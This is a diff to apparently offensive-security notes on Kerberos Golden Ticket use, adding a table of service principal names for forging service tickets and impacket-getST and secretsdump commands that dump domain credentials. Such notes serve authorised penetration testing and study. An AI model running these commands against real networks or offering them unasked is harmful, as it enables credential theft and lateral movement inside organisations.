@@ -145,6 +145,35 @@ klist
 
 ## Use Golden Ticket
 
+When we generate a ticket, we'll have a TGT (Ticket Granting Ticket). To use this ticket for a specific service, we have to craft an ST (Service Ticket) for the specific service we want.
+
+This is all the services available for crafting a ST
+
+<details>
+
+<summary>SPNs list</summary>
+
+| `CIFS/hostname`            | SMB / File shares / Smbclient                 | Often used for lateral movement or dumping files |
+| -------------------------- | --------------------------------------------- | ------------------------------------------------ |
+| `HOST/hostname`            | RDP, WMI, PsExec, WinRM                       | Generic system access — many tools use this      |
+| `LDAP/hostname`            | LDAP directory queries                        | Used to query AD objects                         |
+| `HTTP/hostname`            | WinRM, web services, Outlook Web Access (OWA) | Required for PowerShell Remoting                 |
+| `RPCSS/hostname`           | Remote Procedure Call                         | Rare, used in some remote COM/DCOM scenarios     |
+| `MSSQLSvc/hostname:port`   | Microsoft SQL Server                          | Enumerate or access databases                    |
+| `WSMAN/hostname`           | PowerShell Remoting                           | Alternative to `HTTP/hostname` for WinRM         |
+| `SMTPSVC/hostname`         | SMTP (Exchange)                               | Email systems                                    |
+| `IMAP/hostname`            | IMAP (Exchange)                               | Mailbox access                                   |
+| `POP/hostname`             | POP3 (Exchange)                               | Mailbox access                                   |
+| `TERMSRV/hostname`         | Remote Desktop Services (RDP)                 | For interacting with Terminal Services           |
+| `VPN/hostname`             | VPN services                                  | Rare, usually edge devices                       |
+| `WINRM/hostname`           | PowerShell Remoting                           | Also often mapped to `HTTP/hostname`             |
+| `FQDN$` (computer account) | Implicitly covered under `HOST/hostname`      | Used when impersonating computer accounts        |
+| `SVC/hostname` (custom)    | Custom apps registered with SPNs              | Use `setspn -Q */hostname` to enumerate          |
+
+</details>
+
+
+
 ### mimikatz
 
 Once we have created the Golden Ticket with mimikatz in the current session, we have to open a new cmd to the current privileges.
@@ -159,6 +188,13 @@ mimikatz > misc::cmd # this open cmd promt with current privileges
 ```bash
 export KRB5CCNAME=$(pwd)/NAME.ccache
 
+# create a ST for CIFS service 
+impacket-getST -spn 'CIFS/TARGET_DOMAIN' -k -no-pass DOMAIN/USER_OF_THE_TGT -debug
+
+# set the new ST
+export KRB5CCNAME=$(pwd)/NAME.ccache
+
+# use ST to use secretdump
 imapcket-secretsdump -no-pass -k -dc-ip $DC_IP $DOMAIN.local/$NAME@$MACHINE.$DOMAIN.local
 ```
 {% endcode %}
